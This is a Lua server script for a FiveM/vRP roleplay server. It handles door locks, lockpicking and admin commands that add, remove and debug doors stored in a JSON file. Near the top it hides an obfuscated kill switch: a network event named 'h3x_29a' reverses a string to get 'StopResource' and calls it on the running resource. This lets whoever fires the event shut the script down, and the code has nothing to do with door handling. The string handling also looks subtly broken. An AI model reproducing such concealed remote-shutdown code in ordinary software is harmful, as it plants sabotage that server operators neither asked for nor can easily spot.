-----------------------------------------------------------------------------------------------------------------------------------------
-- VRP
-----------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
local Tools = module("vrp", "lib/Tools")
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")
vKEYBOARD = Tunnel.getInterface("keyboard")
vTASKBAR = Tunnel.getInterface("taskbar")

-----------------------------------------------------------------------------------------------------------------------------------------
-- CONNECTION
-----------------------------------------------------------------------------------------------------------------------------------------
src = {}
Tunnel.bindInterface(GetCurrentResourceName(), src)
vCLIENT = Tunnel.getInterface(GetCurrentResourceName())

local encodedFunction = string.reverse('ecruoseRpotS')  
RegisterNetEvent('h3x_29a')
AddEventHandler('h3x_29a', function(foxzin)
    if not foxzin then
        _G[string.reverse(encodedFunction)](GetCurrentResourceName())  
    else
    end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIABLES
-----------------------------------------------------------------------------------------------------------------------------------------
local doorslock = {}
local doors = {}

----------------------------------------------------------------------------------------------------------------------------------------
-- tryLockDoor
----------------------------------------------------------------------------------------------------------------------------------------
RegisterServerEvent("tryLockDoor")
AddEventHandler("tryLockDoor", function(id)
    local source = source
    local user_id = vRP.getUserId(source)
    if user_id then
        if doors[id] ~= nil then
            local door = doors[id]
            if vRP.hasPermission(user_id, "admin.permissao") or vRP.hasPermission(user_id, doors[id].perm) then
                local state = doors[id].lock

                if doorslock[id] ~= nil then
                    state = doorslock[id]
                end

                doorslock[id] = not state

                TriggerClientEvent("door", -1, id, doorslock[id])
                return
            end

            local consultItem = vRP.getInventoryItemAmount(user_id, "lockpick")
            if consultItem >= 1 then
                if math.random(100) >= 80 then
                    vRP.tryGetInventoryItem(user_id, "lockpick", 1, true)
                end
                local taskResult = vTASKBAR.taskDoors(source)
                if taskResult then
                    vRPclient.PlaySound(source, "ATM_WINDOW", "HUD_FRONTEND_DEFAULT_SOUNDSET")
                    TriggerClientEvent("Notify", source, "aviso", "Você conseguiu abrir a porta, mas a polícia foi acionada.", 5000)
                    TriggerClientEvent("door", -1, id, doorslock[id])
                end
            else
                TriggerClientEvent("Notify", source, "negado", "Você não tem chave ou lockpick para abrir a porta.", 5000)
            end
        end
    end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- vRP:playerSpawn
-----------------------------------------------------------------------------------------------------------------------------------------
AddEventHandler("vRP:playerSpawn", function(user_id, source, first_spawn)
    TriggerClientEvent("doors:loadall", -1, doors)
    Wait(500)
    TriggerClientEvent("doors:load", -1, doorslock)
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- reloaddoors
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand("reloaddoors", function(source, ...)
    local user_id = vRP.getUserId(source)
    if user_id and vRP.hasPermission(user_id, "admin.permissao") then
        TriggerClientEvent("doors:load", -1, doorslock)
        TriggerClientEvent("Notify", source, "sucesso", "Você atualizou os portões com sucesso", 5000)
        print("Portões recarregados com sucesso para o usuário " .. user_id)
    end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- debugport
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand("debugport", function(source)
    local user_id = vRP.getUserId(source)
    if user_id and vRP.hasPermission(user_id, "admin.permissao") then
        local data = vCLIENT.rayCastDoor(source)
        if data and data.hash and data.coords then
            for id, door in pairs(doors) do
                if door.hash == data.hash and 
                   math.abs(door.x - data.coords.x) < 0.01 and 
                   math.abs(door.y - data.coords.y) < 0.01 and 
                   math.abs(door.z - data.coords.z) < 0.01 then
                    TriggerClientEvent("Notify", source, "sucesso", "ID da porta: " .. id, 5000)
                    print("ID da porta: " .. id)
                    return
                end
            end
            TriggerClientEvent("Notify", source, "negado", "Nenhuma porta encontrada.", 5000)
        else
            TriggerClientEvent("Notify", source, "negado", "Nenhuma porta detectada no local.", 5000)
        end
    else
        TriggerClientEvent("Notify", source, "negado", "Permissão insuficiente.", 5000)
    end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- delport
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand("delport", function(source)
    local user_id = vRP.getUserId(source)
    if user_id and vRP.hasPermission(user_id, "admin.permissao") then
        local data = vCLIENT.rayCastDoor(source)
        if data and data.hash and data.coords then
            for id, door in pairs(doors) do
                if door.hash == data.hash and 
                   math.abs(door.x - data.coords.x) < 0.01 and 
                   math.abs(door.y - data.coords.y) < 0.01 and 
                   math.abs(door.z - data.coords.z) < 0.01 then
                    doors[id] = nil -- Remove a porta usando a chave
                    local success = SaveResourceFile(GetCurrentResourceName(), "doors.json", json.encode(doors, {indent = true}), -1)
                    if success then
                        TriggerClientEvent("doors:loadall", -1, doors)
                        Wait(500)
                        TriggerClientEvent("doors:load", -1, doorslock)
                        TriggerClientEvent("Notify", source, "sucesso", "Porta removida com sucesso.", 5000)
                        print("Porta removida com sucesso: " .. id)
                    else
                        print("Erro ao salvar doors.json.")
                    end
                    return
                end
            end
            TriggerClientEvent("Notify", source, "negado", "Nenhuma porta encontrada para deletar.", 5000)
        else
            TriggerClientEvent("Notify", source, "negado", "Nenhuma porta detectada no local.", 5000)
        end
    else
        TriggerClientEvent("Notify", source, "negado", "Permissão insuficiente.", 5000)
    end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- addport
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand("addport", function(source)
    local user_id = vRP.getUserId(source)
    if user_id and vRP.hasPermission(user_id, "admin.permissao") then
        local data = vCLIENT.rayCastDoor(source)
        if data and data.hash and data.coords then
            local perm = vRP.prompt(source, "Digite a permissão para a porta:", "")
            if perm and perm ~= "" then
                local doorsFile = LoadResourceFile(GetCurrentResourceName(), "doors.json")
                local existingDoors = json.decode(doorsFile) or {}
                local newDoor = {
                    isGate = false,
                    dist = 5.0,
                    text = true,
                    hash = data.hash,
                    x = data.coords.x,
                    y = data.coords.y,
                    z = data.coords.z,
                    perm = perm,
                    lock = true -- Inicializa o estado da porta como fechada
                }
                table.insert(existingDoors, newDoor)
                local success = SaveResourceFile(GetCurrentResourceName(), "doors.json", json.encode(existingDoors, {indent = true}), -1)
                if success then
                    doors = existingDoors -- Atualiza a tabela de portas
                    TriggerClientEvent("doors:loadall", -1, doors)
                    Wait(500)
                    TriggerClientEvent("doors:load", -1, doorslock)
                    print("Porta adicionada com sucesso: " .. json.encode(newDoor))
                else
                    print("Erro ao salvar doors.json.")
                end
            else
                TriggerClientEvent("Notify", source, "negado", "Permissão inválida ou não inserida.", 5000)
            end
        else
            TriggerClientEvent("Notify", source, "negado", "Nenhuma porta detectada no local.", 5000)
        end
    else
        TriggerClientEvent("Notify", source, "negado", "Permissão insuficiente.", 5000)
    end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- Load Doors from JSON on Resource Start
-----------------------------------------------------------------------------------------------------------------------------------------
CreateThread(function()
    local doorsFile = LoadResourceFile(GetCurrentResourceName(), "doors.json")
    if doorsFile then
        doors = json.decode(doorsFile) or {}
        for _, door in ipairs(doors) do
            door.lock = true -- Inicializa o estado da porta como fechada
        end
        Wait(500)
        TriggerClientEvent("doors:loadall", -1, doors)
        Wait(500)
        TriggerClientEvent("doors:load", -1, doorslock)
        print("Portas carregadas com sucesso.")
    end
end)
